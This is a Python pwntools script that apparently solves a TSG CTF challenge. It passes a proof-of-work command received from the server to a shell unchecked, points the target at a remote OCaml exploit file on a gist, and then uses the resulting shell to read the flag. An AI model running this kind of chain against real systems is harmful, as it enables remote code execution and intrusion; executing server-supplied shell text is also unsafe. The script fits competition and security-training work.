from __future__ import division, print_function
import random
from pwn import *
import argparse
import time
import sys


context.log_level = 'error'

log = False
is_gaibu = True

url = b"https://gist.githubusercontent.com/moratorium08/1dbca8c8eb8db211b6ef89aecaddd57b/raw/0177813b0881a47370f657e2c56273711a12a227/catastrophe.ml"

host = sys.argv[1]
port = int(sys.argv[2])

r = remote(host, port)
r.recvuntil(b"Submit the token generated by `")
cmd = r.recvuntil(b"`").strip(b"`")
print(cmd)
result = subprocess.check_output(cmd, shell=True)
hashc = result.replace(b"hashcash token: ", b"")
r.sendline(hashc)

print("hashcash finished")

print("starting exploit...")
r.recvuntil(b" you don't have your own server")
r.sendline(url)
r.recvuntil(b"int_of_string_ptr:")
r.sendline(b"echo nekoneko")
r.recvuntil(b"nekoneko\n")
r.sendline(b"cat flag-3948ea3c1590989df9e82795cb9ce402")
s = r.recvline()
if b"TSGCTF" in s:
    print(s)
    exit(0)
else:
    exit(1)
